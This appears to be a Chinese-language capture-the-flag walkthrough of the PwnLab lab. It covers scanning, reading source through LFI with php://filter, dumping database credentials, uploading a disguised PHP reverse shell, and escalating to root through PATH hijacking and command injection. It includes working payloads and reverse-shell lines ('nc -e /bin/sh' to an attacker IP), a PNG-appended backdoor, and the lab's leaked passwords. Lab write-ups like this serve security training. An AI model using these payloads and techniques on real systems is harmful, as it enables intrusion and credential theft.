1、nmap 10.211.55.0/24 -sP
Nmap scan report for 10.211.55.46

2、nmap -sS -sV -A -p- -T5 10.211.55.46
22/tcp closed ssh

80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
58018/tcp open  status  1 (RPC #100024)

3、扫描dirb nikto
config.php ---可访问但是无回显数据库用户密码
index.php  ---主页（文件包含源码）
login.php  ---登录界面

http://10.211.55.46/config.php   ---可以访问无法显示内容需要读取


4、LFI文件包含-读取config

参考文章：
https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/

http://10.211.55.46/?page=php://filter/convert.base64-encode/resource=config
获得base64编码：
echo 'PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8' | base64 -d
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?base64: 输入无效

获得3306的mysql数据库用户密码：
root
H4u%QJ_H99

继续读取index信息：
http://10.211.55.46/?page=php://filter/convert.base64-encode/resource=index
---------------------------------
echo 'PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4=</center>
' | base64 -d
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>base64: 输入无效
---------------------------------
解码发现include("lang/".$_COOKIE['lang']);
可以看出include(“lang/”.$_COOKIE[‘lang’]);意思是使用lang可以打开会话。



5、数据库枚举

mysql -uroot -pH4u%QJ_H99 -h 10.211.55.46
show databases;
use Users
select * from users;

发现信息：
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+

echo 'Sld6WHVCSkpOeQ==' | base64 -d
JWzXuBJJNy
kent
echo 'U0lmZHNURW42SQ==' | base64 -d
SIfdsTEn6I
mike
echo 'aVN2NVltMkdSbw==' | base64 -d
iSv5Ym2GRo
kane


6、文件上传漏洞
kent
JWzXuBJJNy
成功登录：http://10.211.55.46/?page=upload

cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php dayu.php
打开改IP后，顶部加入：GIF，然后保存！
mv dayu.php dayu.php.gif
上传后右键查看源码发现目录：upload/ac8d2ee363b3b155cec9acfd22a47da6.gif
文件名是由md5哈希存储！

kali本地开启：nc -vlp 1234
但是访问：http://10.211.55.46/upload/ac8d2ee363b3b155cec9acfd22a47da6.gif
发现无法访问！！


前面index解码信息，这边用curl打开cookie！
curl -v --cookie "lang=../upload/ac8d2ee363b3b155cec9acfd22a47da6.gif" http://10.211.55.46/index.php

或者：
curl 10.211.55.46:80 -H "Cookie: lang=../upload/ac8d2ee363b3b155cec9acfd22a47da6.gif"

python -c 'import pty; pty.spawn("/bin/bash")'


7、提权

su mike   ---无法登录

su kane
iSv5Ym2GRo
来到：/home/kane目录下发现msgmike程序

ls -la
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
发现该程序是mike的权限！但是在kane用户下！

cd /tmp
cat msgmike
看起来该程序的作者试图在cat不提供完整路径的情况下运行了命令!

在运行Bash程序cat的/tmp目录中创建了一个文件shell，并将其添加到$PATH环境变量的开头，系统先cat在/tmp目录中查找二进制文件，并将执行我们的shell！
在tmp目录下：
echo /bin/bash > cat    ---创建一个shell命令的文件：/bin/sh
chmod 777 cat           ---赋权
export PATH=/tmp:$PATH  ---赋予tmp目录环境变量
cd && ./msgmike


cd /home/mike
-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root
在mike目录下存在msg2root文件！

mike@pwnlab:/home/mike$ ./msg2root
./msg2root
Message for root: cd && /bin/sh
尝试在次执行不完整路径任意命令sh，成功获得root权限！

或者输入：
$(nc -e /bin/sh 10.211.55.19 8888)

--------
Crtl-z
stty raw -echo
fg
reset (wait a few seconds before entering this)
xterm-color


--------
代码审计：文件包含

文件包含代码审计：cat index.php
---
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
---
<?php  
   if (isset($_GET['page']))  
   {  
      include($_GET['page'] . '.php');  
   }  
?>  
---

第4-6行：该地方指出如果设置一个名称_lang_指向文件系统中文件的cookie，它将被包含在内，甚至不必担心它不会以.php结尾！
第20-23行：LFI漏洞获得了.php文件源代码！


一般用法：
http://10.211.55.46/?page=../../../../../../../etc/passwd
但是无法绕过！

理解：
https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/
https://ironhackers.es/herramientas/lfi-cheat-sheet/

1）PHP协议包装器，PHP可以使用HTTP POST数据作为其包含的入口点：/?page=php://input
2）根据php文档提示input是可以读取原文件的源码post信息。
3）php://filter是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西！对于诸如readfile()、file()和 file_get_contents()之类的多合一文件函数能起到奇效！
参考：https://blog.csdn.net/destiny1507/article/details/82347371
4）使用convert.base64-encode输出原文件的base64编码内容！使用PHP过滤器将.php文件内容编码为base64字符串允许绕过服务器来执行！

?page=php://filter/convert.base64-encode/resource=index
参考文章：https://www.php.net/manual/en/filters.convert.php

-------------------
代码审计：文件上传
第2-3行：拒绝访问上传
第16-49行：全是对文件上传禁止的条件

Err0（21行）：以.jpg、.jpeg、.gif和.png！
Err1：提示文件类型为：image，未被识别为图像
Err2：文件类型验证。
Err3：文件名包含'/'以避免LFI
Err4：上传文件失败


----------
拓展小技巧：
1）sqlmap技巧

sqlmap -d 'mysql://root:H4u%QJ_H99@10.211.55.46:3306/Users' --dump -T users -D Users

测试写入权限：
sqlmap -d 'mysql://root:H4u%QJ_H99@10.211.55.46:3306/Users' --current-user --is-dba
由于当前用户不是DBA，无法通过MySQL ROOT 帐户写入文件！

2）最小图片技巧
去png-pixel.com下载一个简单的1x1像素PNG：
https://infosecjohn.blog/posts/vulnhub-pwnlab/

将我的simple-backdoor.php代码附加到它的末尾：
cat /usr/share/webshells/php/simple-backdoor.php >> 1x1-ffffff7f.png

上传：
upload/6847a37e40ac4e9d6c9a577c8fd90b0e.png

curl --output - -b lang=../upload/6847a37e40ac4e9d6c9a577c8fd90b0e.png http://10.211.55.46/index.php?cmd=ls

curl --output - -b lang=../upload/6847a37e40ac4e9d6c9a577c8fd90b0e.png http://10.211.55.47/index.php?cmd=/bin/nc+-e+/bin/sh+10.211.55.19+9999


3）文件分析
用radare2打开它以更好地了解程序做了什么：
s main   ---定位到main函数入口处
pd   ---pd用于打印出反汇编函数

可以看到：
push str.cat__home_mike_msg.txt ; 0x8048540 ; "cat /home/mike/msg.txt"
程序以mike的身份执行cat /home/mike/msg.txt！


IDA打开：msg2root
asprintf(&command, "/bin/echo %s >> /root/messages.txt", &s);
提示程序以root身份执行'/bin/echo %s >> /root/messages.txt'这允许注入以root身份执行的bash代码！













